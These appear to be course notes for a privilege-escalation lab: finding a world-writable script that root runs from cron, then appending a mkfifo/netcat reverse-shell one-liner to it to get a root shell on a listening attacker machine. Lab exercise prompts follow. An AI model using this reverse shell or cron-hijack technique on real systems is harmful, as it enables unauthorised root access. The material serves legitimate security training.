# Abusing Cron Jobs

Inspecting the cron log file
>``` shell
>joe@debian-privesc:~$ grep "CRON" /var/log/syslog
>
># ========== Expected Result ==========
>...
>Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
>Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
>Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
>Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
>Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
># =====================================
>```

Showing the content and permissions of the user_backups.sh script
>``` shell
>joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
>
># ========== Expected Result ==========
>#!/bin/bash
>
>cp -rf /home/joe/ /var/backups/joe/
># =====================================
>
>joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
>
># ========== Expected Result ==========
>-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
># =====================================
>```

Inserting a reverse shell one-liner in user_backups.sh
>``` shell
>joe@debian-privesc:~$ cd .scripts
>
>joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
>
>joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
>
>joe@debian-privesc:~/.scripts$ cat user_backups.sh
>
># ========== Expected Result ==========
>#!/bin/bash
>
>cp -rf /home/joe/ /var/backups/joe/
>
>
>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f
># =====================================
>```

Getting a root shell from our target
>``` shell
>kali@kali:~$ nc -lnvp 1234
>
># ========== Expected Result ==========
>listening on [any] 1234 ...
>connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
>/bin/sh: 0: can't access tty; job control turned off
># id
>uid=0(root) gid=0(root) groups=0(root)
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which log file holds information about cron job activities? Include the full path in the answer.
>``` shell
>
>```
>

Lab 2 - Connect to VM 2 and look for another misconfigured cron job. Once found, exploit it and obtain a root shell in order to get a flag.
>``` shell
>
>```
>
